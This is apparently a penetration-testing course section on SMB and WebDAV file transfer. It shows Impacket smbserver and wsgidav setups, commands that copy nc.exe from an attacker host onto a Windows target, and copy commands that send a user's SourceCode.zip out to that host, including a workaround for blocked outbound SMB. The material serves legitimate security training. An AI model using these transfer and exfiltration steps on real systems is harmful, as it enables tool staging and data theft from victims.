## SMB Downloads

The Server Message Block protocol (SMB protocol) that runs on port TCP/445 is common in enterprise networks where Windows services are running. It enables applications and users to transfer files to and from remote servers.

We can use SMB to download files from our Pwnbox easily. We need to create an SMB server in our Pwnbox with [smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py) from Impacket and then use `copy`, `move`, PowerShell `Copy-Item`, or any other tool that allows connection to SMB.

#### Create the SMB Server

```shell-session
arenwald@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

To download a file from the SMB server to the current working directory, we can use the following command:

#### Copy a File from the SMB Server

```cmd-session
C:\htb> copy \\192.168.220.133\share\nc.exe

        1 file(s) copied.
```

New versions of Windows block unauthenticated guest access, as we can see in the following command:

```cmd-session
C:\htb> copy \\192.168.220.133\share\nc.exe

You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.
```

To transfer files in this scenario, we can set a username and password using our Impacket SMB server and mount the SMB server on our windows target machine:

#### Create the SMB Server with a Username and Password

```shell-session
arenwald@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

#### Mount the SMB Server with Username and Password

```cmd-session
C:\htb> net use n: \\192.168.220.133\share /user:test test

The command completed successfully.

C:\htb> copy n:\nc.exe
        1 file(s) copied.
```

**Note:** You can also mount the SMB server if you receive an error when you use `copy filename \\IP\sharename`.

## SMB Uploads

We previously discussed that companies usually allow outbound traffic using `HTTP` (TCP/80) and `HTTPS` (TCP/443) protocols. Commonly enterprises don't allow the SMB protocol (TCP/445) out of their internal network because this can open them up to potential attacks. For more information on this, we can read the Microsoft post [Preventing SMB traffic from lateral connections and entering or leaving the network](https://support.microsoft.com/en-us/topic/preventing-smb-traffic-from-lateral-connections-and-entering-or-leaving-the-network-c0541db7-2244-0dce-18fd-14a3ddeb282a).

An alternative is to run SMB over HTTP with `WebDav`. `WebDAV` [(RFC 4918)](https://datatracker.ietf.org/doc/html/rfc4918) is an extension of HTTP, the internet protocol that web browsers and web servers use to communicate with each other. The `WebDAV` protocol enables a webserver to behave like a fileserver, supporting collaborative content authoring. `WebDAV` can also use HTTPS.

When you use `SMB`, it will first attempt to connect using the SMB protocol, and if there's no SMB share available, it will try to connect using HTTP. In the following Wireshark capture, we attempt to connect to the file share `testing3`, and because it didn't find anything with `SMB`, it uses `HTTP`.

#### Configuring WebDav Server

To set up our WebDav server, we need to install two Python modules, `wsgidav` and `cheroot` (you can read more about this implementation here: [wsgidav github](https://github.com/mar10/wsgidav)). After installing them, we run the `wsgidav` application in the target directory.

#### Installing WebDav Python modules

```shell-session
arenwald@htb[/htb]$ sudo pip3 install wsgidav cheroot

[sudo] password for plaintext: 
Collecting wsgidav
  Downloading WsgiDAV-4.0.1-py3-none-any.whl (171 kB)
     |████████████████████████████████| 171 kB 1.4 MB/s
     ...SNIP...
```

#### Using the WebDav Python module

```shell-session
arenwald@htb[/htb]$ sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 

[sudo] password for plaintext: 
Running without configuration file.

#### Connecting to the Webdav Share

Now we can attempt to connect to the share using the `DavWWWRoot` directory.

```cmd-session
C:\htb> dir \\192.168.49.128\DavWWWRoot

 Volume in drive \\192.168.49.128\DavWWWRoot has no label.
 Volume Serial Number is 0000-0000

 Directory of \\192.168.49.128\DavWWWRoot

05/18/2022  10:05 AM    <DIR>          .
05/18/2022  10:05 AM    <DIR>          ..
05/18/2022  10:05 AM    <DIR>          sharefolder
05/18/2022  10:05 AM                13 filetest.txt
               1 File(s)             13 bytes
               3 Dir(s)  43,443,318,784 bytes free
```

**Note:** `DavWWWRoot` is a special keyword recognized by the Windows Shell. No such folder exists on your WebDAV server. The DavWWWRoot keyword tells the Mini-Redirector driver, which handles WebDAV requests that you are connecting to the root of the WebDAV server.

You can avoid using this keyword if you specify a folder that exists on your server when connecting to the server. For example: \192.168.49.128\sharefolder

#### Uploading Files using SMB

```cmd-session
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
```

**Note:** If there are no SMB (TCP/445) restrictions, you can use impacket-smbserver the same way we set it up for download operations.
